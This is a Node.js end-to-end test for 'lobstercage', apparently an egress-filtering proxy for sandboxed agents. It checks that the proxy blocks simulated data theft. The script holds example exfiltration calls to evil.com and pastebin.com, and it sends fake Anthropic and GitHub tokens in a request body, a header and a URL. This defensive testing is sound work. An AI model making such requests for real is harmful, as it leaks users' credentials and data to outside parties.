#!/usr/bin/env node
/**
 * lobstercage e2e test — exercises allowed, blocked-domain,
 * and secret-exfil scenarios using Node.js native fetch.
 *
 * The proxy-fetch.mjs patch (loaded via NODE_OPTIONS=--import)
 * makes native fetch respect HTTP_PROXY env vars automatically.
 */

const FAKE_ANTHROPIC_KEY = "sk-ant-abc123DEF456ghi789JKL012mno345PQR678stu901VWX";
const FAKE_GITHUB_TOKEN = "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn";

async function test(label, fn) {
  process.stdout.write(`\n[${label}] `);
  try {
    const res = await fn();
    const body = await res.text();
    console.log(`HTTP ${res.status}`);
    if (res.status === 403) {
      console.log(`  BLOCKED: ${body}`);
    } else {
      console.log(`  Body (first 200 chars): ${body.slice(0, 200)}`);
    }
  } catch (err) {
    console.log(`ERROR: ${err.message}`);
  }
}

(async () => {
  console.log("=== lobstercage e2e test (native fetch + proxy patch) ===");
  console.log(`HTTP_PROXY=${process.env.HTTP_PROXY}`);
  console.log(`NODE_OPTIONS=${process.env.NODE_OPTIONS}\n`);

  // ── Legit activity ──────────────────────────────────

  await test("LEGIT GET — httpbin.org/get (allowed domain)", () =>
    fetch("http://httpbin.org/get")
  );

  await test("LEGIT POST — httpbin.org/post (allowed domain, clean body)", () =>
    fetch("http://httpbin.org/post", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ message: "hello from sandboxed agent", count: 42 }),
    })
  );

  // ── Blocked domain ─────────────────────────────────

  await test("EXFIL — evil.com (not in allowlist)", () =>
    fetch("http://evil.com/steal?data=secret")
  );

  await test("EXFIL — pastebin.com (not in allowlist)", () =>
    fetch("http://pastebin.com/api_post.php", {
      method: "POST",
      body: "stolen_data=very_sensitive_info",
    })
  );

  // ── Secret leak to allowed domain ──────────────────

  await test("EXFIL — Anthropic key in POST body to allowed domain", () =>
    fetch("http://httpbin.org/post", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ key: FAKE_ANTHROPIC_KEY }),
    })
  );

  await test("EXFIL — GitHub token in header to allowed domain", () =>
    fetch("http://httpbin.org/get", {
      headers: { "Authorization": `token ${FAKE_GITHUB_TOKEN}` },
    })
  );

  await test("EXFIL — Anthropic key in URL query to allowed domain", () =>
    fetch(`http://httpbin.org/get?apikey=${FAKE_ANTHROPIC_KEY}`)
  );

  // ── One more legit request ─────────────────────────

  await test("LEGIT GET — httpbin.org/status/200 (allowed, clean)", () =>
    fetch("http://httpbin.org/status/200")
  );

  console.log("\n\n=== test complete ===");
})();
